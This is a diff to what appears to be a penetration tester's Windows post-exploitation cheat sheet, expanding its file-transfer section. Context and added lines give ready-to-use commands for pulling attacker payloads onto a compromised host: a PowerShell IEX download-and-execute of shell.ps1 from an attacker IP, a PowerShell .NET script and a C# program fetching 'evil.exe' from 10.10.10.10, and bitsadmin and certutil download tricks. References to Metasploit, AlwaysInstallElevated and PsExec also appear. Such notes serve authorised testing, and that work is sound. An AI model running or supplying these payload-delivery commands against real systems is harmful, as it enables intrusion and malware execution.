@@ -265,11 +265,11 @@ You can detect and exploit this vulnerability with metasploit using the module: 
 
 TODO: Categorize each of these, prep for scripting, add descriptions
 
-### 
+## File Transfters
 
 ### Download files with Windows FTP
 
-Windows has an FTP client built in that is already in PATH. You can open an FTP connection and download the files directly from Kali on the command line.  To do this, you can authenticate with user `anonymous` and any password, or if FTP account information is known, use that.  Windows FTP can take a “script” of commands directly from the command line. This means if you have a text file called `ftp_commands.txt` on the system that contains this:
+Windows has an FTP client built in at `C:\Windows\System32\ftp.exe` that is already in PATH. You can open an FTP connection and download the files directly from Kali on the command line.  To do this, you can authenticate with user `anonymous` and any password, or if FTP account information is known, use that.  Windows FTP can take a “script” of commands directly from the command line. This means if you have a text file called `ftp_commands.txt` on the system that contains this:
 
 ```text
 open 10.10.10.10
@@ -293,7 +293,7 @@ Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no us
 #### Using Invoke-WebRequest
 
 ```text
-Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1'-OutFile 'shell.ps1'
+Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1' -OutFile 'shell.ps1'
 ```
 
 #### Download and Execute
@@ -302,16 +302,69 @@ Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1'-OutFile 'shell.ps1'
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.26/shell.ps1')
 ```
 
-#### **Using Bitsadmin**
+#### Using .Net:
+
+```bash
+$url = "http://10.10.10.10/evil.exe"
+$file = "evil.exe"
+
+# Add the necessary .NET assembly
+Add-Type -AssemblyName System.Net.Http
+
+# Create the HttpClient object
+$client = New-Object -TypeName System.Net.Http.Httpclient
+$task = $client.GetAsync($url)
+$task.wait();
+[io.file]::WriteAllBytes($file, $task.Result.Content.ReadAsByteArrayAsync().Result)
+```
+
+### **Using Bitsadmin**
 
 ```text
 bitsadmin /transfer mydownloadjob /download /priority normal http:///$ip/$file C:\\Users\\%USERNAME%\\AppData\\local\\temp\\$file
 ```
 
-**Using Certutil**
+### **Using Certutil**
 
 ```text
 certutil.exe -urlcache -split -f "http://$ip/$file" $file
+```
+
+```bash
+set url=https://www.nsa.org/content/hl-images/2017/02/09/NSA.jpg
+set file=file.jpg
+certutil -urlcache -split -f %url% %file%
+#Or
+certutil.exe -verifyctl -f -split %url% %file%
+```
+
+### C\# Command-line build with csc.exe:
+
+[https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe)
+
+```csharp
+using System;
+using System.IO;
+
+using System.Net.Http;
+using System.Threading.Tasks;
+
+namespace DownloadImage
+{
+    class Program
+    {
+        static async Task Main(string[] args)
+        {
+            using var httpClient = new HttpClient();
+            var url = "http://10.10.10.10/evil.exe";
+            byte[] imageBytes = await httpClient.GetByteArrayAsync(url);
+
+            using var fs = new FileStream("evil.exe", FileMode.Create);
+            fs.Write(imageBytes, 0, imageBytes.Length);
+
+        }
+    }
+}
 ```
 
 ### **AlwaysInstall Elevated**
@@ -442,6 +495,7 @@ PsExec.exe -u $hostname\$UserName -p $Password "$Commands"
 
 * [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
 * [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+* [https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools](https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools)
 
 
 
